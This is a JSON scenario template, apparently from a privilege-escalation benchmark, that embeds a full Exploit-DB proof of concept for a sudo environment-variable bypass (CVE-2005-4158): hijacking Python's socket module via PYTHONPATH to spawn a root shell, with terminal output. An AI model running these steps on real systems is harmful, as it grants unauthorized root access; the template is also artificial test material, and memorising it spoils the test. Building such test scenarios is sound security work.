@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_27057",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Sudo 1.6.x - Environment Variable Handling Security Bypass (2) (CVE-2005-4158;OSVDB-20764)\n\nExploit source code (27057.py):\n```\nsource: https://www.securityfocus.com/bid/16184/info\n\nSudo is prone to a security-bypass vulnerability that could lead to arbitrary code execution. This issue is due to an error in the application when handling environment variables.\n\nA local attacker with the ability to run Python scripts can exploit this vulnerability to gain access to an interactive Python prompt. That attacker may then execute arbitrary code with elevated privileges, facilitating the complete compromise of affected computers.\n\nAn attacker must have the ability to run Python scripts through Sudo to exploit this vulnerability.\n\nThis issue is similar to BID 15394 (Sudo Perl Environment Variable Handling Security Bypass Vulnerability).\n\n## Sudo local root escalation privilege ##\n## vuln versions :  sudo < 1.6.8p10\n## adv : https://www.securityfocus.com/bid/16184\n## by breno - breno at kalangolinux dot org\n\n## You need sudo access execution for some python script ##\n\n\n## First look sudoers file. User 'breno' can execute expl_python_sudo.py script\n\nbreno  ~ $ -> cat /etc/sudoers\n\nbreno   ALL=(ALL) /home/breno/expl_python_sudo.py\n\n## Second, see our simple PoC python script\n\nbreno  ~ $ -> cat /home/breno/expl_python_sudo.py\n#!/usr/bin/python\nimport sys\nimport socket\nimport os\n\nprint \"Python Sudo Exploit\"\nexp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nexp.close()\nbreno  ~ $ ->\n\n## Sexy !! Do nothing :)\n\n## Ok. What you need to do to get root is hijacking socket.py module , change close()\nfunction to execute something and\n## change PYTHONPTAH env.\n\nbreno  ~ $ -> cp /usr/lib/python2.3/socket.py /home/breno/\n\nbreno  ~ $ -> vi /home/breno/socket.py\n...\nimport os\n...\ndef close(self):\nos.execl(\"/bin/sh\",\"/bin/ah\");\nself._sock = _closedsocket()\nself.send = self.recv = self.sendto = self.recvfrom = self._sock._dummy\nclose.__doc__ = _realsocket.close.__doc__\n...\n\n## Ok .. save it and export env\n\nbreno  ~ $ -> export PYTHONPATH=/home/breno\n\n## .. and execute script. Too much sexy !!!\n\nbreno  ~ $ -> sudo /home/breno/expl_python_sudo.py\nPython Sudo Exploit\nroot  ~ # -> id\nuid=0(root) gid=0(root) grupos=0(root)\nroot  ~ # ->\n```",
+  "cve": "CVE-2005-4158;OSVDB-20764",
+  "exploitdb_id": "27057",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_27057",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
